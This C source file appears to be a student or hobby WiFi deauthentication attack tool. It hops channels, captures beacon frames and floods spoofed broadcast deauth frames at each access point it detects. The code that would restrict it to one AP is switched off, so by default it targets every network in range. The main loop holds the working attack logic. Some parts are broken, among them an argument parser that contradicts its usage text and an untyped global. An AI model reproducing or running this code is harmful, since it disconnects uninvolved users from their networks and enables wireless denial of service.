#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include "deauth.h"
#include "iwlib.h"
#include "dot11.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

void hexdump(u_char* packet, unsigned int len){
    puts("[TEST Code]");
    for(unsigned int i = 0; i < len; i++){
        if((i % 0x10) == 0){
            puts("");
        }
        printf("%02hhx ", packet[i]);
    }
    puts("\n");
}

void usage() {
    puts("syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]");
    puts("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

typedef struct {
    char * interface;
} Param;

Param param  = {
    .interface = NULL,
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return false;
    }

    param->interface = argv[1];

    return true;
}

int mac2hex(char * str_mac, char mac[6]){

    // int test = strlen(str_mac);
    if(strlen(str_mac) != 17){
        return -1;
    }
    char tmp_mac[18];
    memcpy(tmp_mac, str_mac, 17);
    char *ptr = strtok(tmp_mac, ":");
    int mac_idx = 0;
    char tmp[4] = {0,};
    while(ptr != NULL){
        sprintf(tmp, "0x%s", ptr);
        mac[mac_idx++] = strtol(tmp, NULL, 16);
        ptr = strtok(NULL, ":");
    }
    return 0;
}


int skfd;
struct iw_range range;
// total channel count : range.num_frequency
// channel info : range.freq[idx].i

int parse_channel(){ // only get channel number
    if(iw_get_range_info(skfd, param.interface, &range) < 0){
        fprintf(stderr, "%-8.16s  no frequency information.1\n\n", param.interface);
        return -2; // iw_get_range_info fail...
    }
    else{
        if(range.num_frequency <= 0){
            fprintf(stderr, "%-8.16s  no frequency information.2\n\n", param.interface);
            return -1; // no channel
        }
    }
    return 0; // complete
}

void change_channel(double freq){
    struct iwreq wrq;
    iw_float2freq(freq, &(wrq.u.freq));
    wrq.u.freq.flags = IW_FREQ_FIXED;
    iw_set_ext(skfd, param.interface, SIOCSIWFREQ, &wrq);
}

int thread_loop = 1;
int * t_change_ch(void * dummy){ // thread function
    while(1){
        double channel = 1;
        for(int i=0; i < range.num_frequency; i++){
            if(!thread_loop)
                return 0;
            channel = range.freq[i].i;
            change_channel(channel);
            sleep(1);
        }
    }
}

end_flag = 0;
void end(){
    end_flag = 1;
}

int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    signal(SIGINT, end);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.interface, errbuf);
        return -1;
    }

    struct Deauth_packet * deauth_broad  = malloc(sizeof(struct Deauth_packet));
    initialize(deauth_broad);
    initialize_dot11();

    // channel parse
    if((skfd = iw_sockets_open()) < 0){
        perror("socket");
        return -1;
    }
    if(parse_channel()){
        iw_sockets_close(skfd);
        return 0;
    }

    // run thread
    pthread_t p_thread;
    char dummy[] = "change_channel";
    int thread_id = pthread_create(&p_thread, NULL, t_change_ch, (void *)dummy);
    if (thread_id < 0){
        perror("thread create error");
        exit(-1);
    }

    while(1){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        hexdump((u_char *)packet, 0x36); // test

        if(get(packet)){ // beacon
            print_BSSID(mgm_frame_struct->BSSID); // test
            memset(deauth_broad->dest_addr, 0xff, 6);
            memcpy(deauth_broad->src_addr, mgm_frame_struct->BSSID, 6);
            memcpy(deauth_broad->BSSID, mgm_frame_struct->BSSID, 6);
            hexdump((u_char *)deauth_broad, 0x26); // test

            unsigned int loop_count = 0;
            int test_flag = 0; // for test
            char tmp_mac[6];   // for test
            if(test_flag){     // test code
                mac2hex("00:11:22:33:44:55", tmp_mac); // set your ap BSSID
                if(!(memcmp(deauth_broad->BSSID, tmp_mac, 6))){
                    while(loop_count < 10000){
                        send_packet(pcap, (u_char *)deauth_broad);
                        loop_count++;
                    }
                }
            } else{
                while(loop_count < 10000){
                    send_packet(pcap, (u_char *)deauth_broad);
                    loop_count++;
                }
            }
        }
        reset();
        if(end_flag) // SIGINT
            break;
    }
    // end
    int status;
    thread_loop = 0;
    pthread_join(p_thread, (void **)&status);
    iw_sockets_close(skfd);

    pcap_close(pcap);

}
